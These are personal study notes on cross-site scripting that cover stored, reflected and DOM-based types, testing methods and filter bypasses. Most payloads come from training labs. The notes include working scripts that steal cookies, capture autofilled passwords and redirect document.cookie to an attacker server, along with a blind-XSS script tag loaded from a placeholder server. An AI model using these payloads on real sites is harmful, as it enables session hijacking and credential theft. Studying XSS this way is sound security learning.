# XSS

[[XSS html tags]]
[[bypass xss filters]]
[[HTML attributes]]


based on context

* instead of taking notes of all the payloads and all, add them to a automation and take
  note of the philosophy.

taking advantage of web applications executing scripts on user's browsers.

finding the functionalities where user changes some part of the applications
code that is then executed (dynamic scripts), then changing it.

allows an attacker to:
  * compromise the interactions that users have with a vulnerable application
  * circumvent the same origin policy
  * masquerade as a victim user, to carry out any actions that the user is
 able to perform

Occur as a result of improperly sanitized user input being embedded in the UI/ DOM.

XSS attacks can obtain any type of data present in the current web application.

# XSS types:

* stored: the malicious script is first stored in the website's database, then executed. (in
  database)
* Reflected: the malicious script originates from the current HTTP request reflected by a
  server. (in request and reflected by server)
* DOM-based: the vulnerability exists in client-side code (the browser) and is executed
  there. (stored and executed in the browser)

## stored:

app receives data, stores it in the database and and unsafely includes it in
it's *later* HTTP response.

EX:

1. if this payload is embedded in a comment, victim just have to visit the page.

`<script>alert('hacked');</script>`

or it could be in a request:
`postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`

2. if there is an XSS payload in the title of a video or article in the front page of the site, it would effect people visiting it.

EXAMINE:

1. test all relevant *entry points* and all *exit points*
  * Entry points:
    * Parameters or other data within the URL query string and message body.
    * The URL file path.
    * HTTP request headers
    * out-of-band routes via which an attacker can deliver data into the application:
      * emails into a webmail app

  * exit points:
    * all possible HTTP responses (to any kind of application user in any situation)
    * audit logs (visible to some application user)

2. locate the links between entry and exit points.
  * work through entry points, submit a specific value into each one, and monitor the apps
    responses where the submitted values appears.

    Determine if the observed value is stored in different request or simply reflected.

3. test for a vulnerability:
  * determine the context within the response where the stored data appears and test
 * look for an, appropriate payload.

  with the same methodology as reflected XSS.

EX:

* `<input><script>alert(1);</script></input`

## reflected:

app receives an http request and includes the data in it's *immediate* response.

processed in the server, returned to the user without being stored in the
database.

EX:

1. the page relies on the user input to construct the page, e.g. on displaying
search results.

`https://example.com/search?q=<script>alert('hacked');</script>`

2. `https://insecure-website.com/status?message=All+is+well`
results `<p>Status: All is well.</p>`

EXPLOIT:

* send a malicious link and somehow send it to the victim (via email, or ad for example)
* placing links on a website controlled by attacker.

EXAMINE:

1. look for every entry point/ input opportunity within http requests:
  * message body
  * headers
  * URL :
    * fragments
    * parameters
    * query string
    * file path
  * you might be able to edit the *request* parameters, even if there there isn't an input
    method on the website.

2. submit random values:
  * determine if it's reflected in the response
  * it should be short and only alphanumeric to survive input validations

1. determine the reflection context (where is it reflected):
  * between html tags
  * within a quoted tag attribute
  * a JavaScript string
  or ...

4. insert a payload:
  * send a combination of characters `abc ' " } < > ; // # - ()` to see how they are
    handled.
  * try html tags, look in the documentation for available attributes.
  * Take note of which ones the application escapes and which get rendered directly.
  * based on the context
  * close existing tags.
  * to trigger JavaScript execution
  * keep the random value, then insert the payload before or after it, so you can find it by
    searching the random value in the page source.
  * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`

EX:

* [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| HTML context]]
* [[XSS_examples#Reflected XSS just custom tags allowed| custom tags]]
* [[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| SVG and <animate>]]
* [[XSS_examples#Reflected XSS with some SVG markup allowed| SVG allowed]]
* [[XSS_examples#angle brackets encoded| angle brackets encoded]]
* [[XSS_examples#Reflected XSS in canonical link tag| canonical link tag]]

## DOM-based cross-site scripting:

attackers attack the Dom when a page takes user input and alters the Dom based
on that input.

it happens when a website contains JavaScript that takes an attacker-controllable value,
known as a *source*, and passes it into a dangerous function, known as a *sink* (writes it to a sink).

* the main source for DOM XSS is the URL.
* DOM could be manipulated by [DOM Objects](DOM.md#_DOM_Objects).

* not all sources work with every sinks:

EXAMINE:

1. test html sinks

* place a random alphanumeric string in to the source.
* use developer tools to inspect and find where the string appears.
* refine your input based on the context of where your string appears in the DOM. e.g. close
  the double quotes.
* if your data gets URL encoded before being processed, then an XSS attacks is unlikely to
  work.

2. test JavaScript execution sinks

* your input doesn't appear in the DOM.
* find cases in the page's JavaScript code where a *source* is referenced.
* use the JavaScript debugger to add a breakpoint and follow hot the source is used.

3. check if the source or it's values or a variable pointed to it are passed to a sink.

4. found a sink? hover over the variable to see it's value. refine the input to see if you
   can do a successful attack.

maybe? DOM XSS with different sources and sinks

EX:

* [[XSS_examples#sink: `document.write`, source: `location.search`]]

* [[XSS_examples#sink `innerhtml`, source `location.search`]]

* [[XSS_examples#jQuery sink: `selector` using a `hashchange` event |jQuery sink: `selector` using a `hashchange` event]]

* [[XSS_examples#jQuery anchor sink `href` attribute]]

* [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|AngularJS expression with angle brackets and double quotes HTML-encoded]]

#### [[Reflected DOM XSS]]

#### [[Stored DOM XSS]]

### XSS into JavaScript

the `<script>` tags are executed after the browser is done with html parsing
and identifying page elements, so breaking the `<script>` doesn't break our payload.
#### closing the `script` tag

`</script><script>alert(1)</script>`

#### breaking out of a JavaScript string

```js
`<script>
var searchTerms = '123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>`
```

say we add this: `123'; alert();` it won't execute, because there will be an
excess `'` left which breaks the code: `'123';alerr();';...`

but this: `123'; alert(); let var = 'test` works.

Payload: `'-alert()-'`

result: `var searchTerms = ''-alert()-'';`

#### single quotes escaped

`';alert(document.domain)//` is converted to `\';alert(document.domain)//`

`\';alert(document.domain)//`, escapes the backslash: `\\';alert(document.domain)//`

#### with some characters blocked

characters could be restricted, on the website or a firewall blocking the
request.

what could we do: experiment with other ways (rather than `()` or other blocked
stuff.) of calling functions.

e.g. use `throw` with exception handler:

`onerror=alert;throw 1`

Assigns `alert()` to global exception handler, then `throw 1`, passes 1 to the
exception handler (throws an error?).

`https://portswigger.net/research/xss-without-parentheses-and-semi-colons`


payload:
`post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`


`throw` returns the last value in the comma separated list:

`throw/**/onerror=alert,1337`

  * `onerror` is JavaScript's error handler.
  * `onerror=alert` assigns alert() to `onerror`, overwriting `error()` to do
    `alert()`
  * the error is going to throw the value `1337`.
    we won't have `uncought` (default error handler behaviour) but `1337` alerted.

`x=x=>{throw/**/onerror=alert,1337}`

  * an arrow function:

    we can't write it like `x=()=>` as it's supposed to be written because `()` will be blocked,so: `x=x=>`.

    also no spaces, it's going to break the url.

  * now the `throw` is inside the function, so it happens if it's called.

`toString=x`

  * it's default behaviour is to convert a data type to string.
  * but now `toString` is the function `x`.
  * so whenever JavaScript calls `toString` it's going to call `x`.

`window+""`

  * string concatenation, so `toString` is used by JavaScript.

the js code to be injected in:
`<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">`

`fetch`: dispatching http requests and manipulating response, the url is `/analytics` and other http request data.

we are inside the configuration options object of the `fetch` method and we should break out and add another option to the `fetch` API.

with our payload we send three argument instead of two to `fetch`, but it doesn't consider the excess, but we can use it to assign a value to a variable.

* `&`: in browser term: the next key value pair. it allows the page to
  continue working.

* `/**/` we can't inject spaces, but it's needed.

### use of HTML-encoding

when the XSS context is an existing JavaScript within a quoted tag attribute,
we can use HTML-encoding to bypass some filters.

When the browser has parsed out the HTML tags and attributes, it will perform
HTML-decoding of tag attribute.

#### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

`<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">t</a>`

if there isn't a single quote, it won't be escaped.
payload: `http://test.com&apos;-alert(document.domain)-&apos;`

#### JavaScript template literals

js template literals are string literals that allow embedded js expressions:

`<script>
var message = `0 search results for '123'`;
document.getElementById('searchMessage').innerText = message;
</script>`

use `${}` to embed as expression to be executed: `${alert()}`

`var message = `0 search results for '${alert()}'`;`

## exploiting XSS

### to steal cookies

exploit it to send victim's cookies to your domain.
to do this we should make the browser to send and http requests.

it has limitations:
  * victim not logged in
  * cookies hidden from js by `HttpOnly`
  * ...

but how to make user send an http request?

payload:

```js
<script>

window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 't@t');
data.append('website', 'http://test.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
```

will be used so that the person visiting the site, comments his token.


### to capture passwords

password managers autofill passwords.

the idea is to create a password input, reading the auto-filled password and
send it to our domain.

```js
<input type="txt" name="username">
<input type="password" name="password" onchange="hax()">

<script>

function hax() {
var token = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;


var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', `${username}:${password}`);
data.append('name', 'victim');
data.append('email', 't@t');
data.append('website', 'http://test.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
}
</script>
```

### sending csrf to another destination:

`fetch('destination', {
...
});`

## DOM based manipulation

### web messages can be used as a source

If a page handles incoming web messages in an unsafe way, for example, by *not
verifying the origin of messages* correctly in the event listener, properties
and functions that are called by the event listener can potentially become
sinks.

#### DOM XSS using web messages

`<script>
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
</script>`

Payload: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

`postMessage()` enables cross-origin communication between Window objects;
between a page and a pop-up that it spawned, or between a page and an iframe.

it sends a `message` *event* to the specified window: `window.postMessage(message)`

`contentWindow` property returns the Window object of an HTMLIFrameElement.

in the case of this payload:

`'*'` is used as the target origin, which means that the message can be
received by any domain.

`postMessage()` sends a web message to the home page. the event listener adds
it to the DOM.

#### using JavaScript URL

JS URL `javascript:`

<script>
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
</script>

`onload="this.contentWindow.postMessage('javascript:print()//http:','*')"`

comments (//) can be used to mask or bypass URL validation.

the script above is vulnerable, so if we have http anywhere in the payload, it
will be sent to the location.href. but there, that part of the payload
containing http is considered to be commented.

### Origin verification

origin verifications could be flawed.

`indexOf()`, `startWith()`, `endsWith()` methods are unsafe.

```js
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

when `case` is "load-channel" is interesting.

`<iframe src=https://0a9700d40387d3bc82b4ab24000600c3.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

#### cookie manipulation

Some DOM-based vulnerabilities allow attackers to manipulate data that they do
not typically control. This transforms normally-safe data types, such as
cookies.

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie.

`<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>`

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`

e iframe loads for the first time, the browser temporarily opens the malicious
URL, which is then saved as the value of the lastViewedProduct cookie. The
onload event handler ensures that the victim is then immediately redirected to
the home page.

* When the iframe is first loaded, window.x is undefined (or not set), so the
  condition if(!window.x) evaluates to true.
* The src of the iframe is immediately changed (or reloaded) to the specified
  URL ('https://YOUR-LAB-ID.web-security-academy.net'), triggering a second
  load of the iframe.
* After reloading, window.x is now 1, so the next time the onload event fires,
  the if(!window.x) condition will be false, preventing further reloads.

### DOM clobbering

inject HTML into a page to manipulate the DOM and ultimately change the
behavior of JavaScript on the page. useful in cases where XSS is not possible,
but you can control some HTML on a page where the attributes id or name are
whitelisted by the HTML filter.

The most common form of DOM clobbering uses an anchor element to overwrite a
global variable, which is then used by the application in an unsafe way.

## general TEST:

submit some simple unique input into every entry point in the application,
identify every location where the submitted input is returned in HTTP responses
or DOM, and testing each location individually to determine whether suitably
crafted input can be used to execute arbitrary JavaScript.

* add simple obvious inputs at first, `<>`, html tags, hello world, whatever.

## to get user's data by XSS:

for example user's cookies, you could redirect them to your server.
this is actually straight forward:
`<scirpt>document.location=<yourServer>+document.cookie</script>`

then after we take the user's cookie, we will simply add it into a request to the account.

* you can use `john the ripper` to find the hashed values and specify the algorithm using: `--format=raw-md5`


# possible defenses against XSS

* regex to ban script tags
* CSP ([[content security policy]]) rules

monitoring the input:
* validating: whether it's malicious
* sanitizing: changes part of it before further processing

POC:
`<script>alert('XSS by Vickie');</script>`

# special URL schemes:

`javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"`
the same alert in base64 to bypass filters.

# BLIND XSS:

try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!

# how to handle links to examples
 1. in some other file (at some point I will have to have multiple examples in one file and
    I should be able to link to an specific one) not sure if it's supported in pandoc but it
    is in obs, and no idea on vimwiki
 2. each example in separate file (too messy, but works)
 3. in the same docuement: will be too long and slow.

* use tags instead of making a file for everythig? instead of bypass filters, just add a tag #XSS_bypass_filter anywhere in the document, then when needed search for it.


#### pwn

* execute JavaScript inside a victim's browser to initiate new HTTP requests masquerading as the victim

`fetch()` could be used for this.

try injecting anyhow
try injecting the admin
try getting admin's /flag.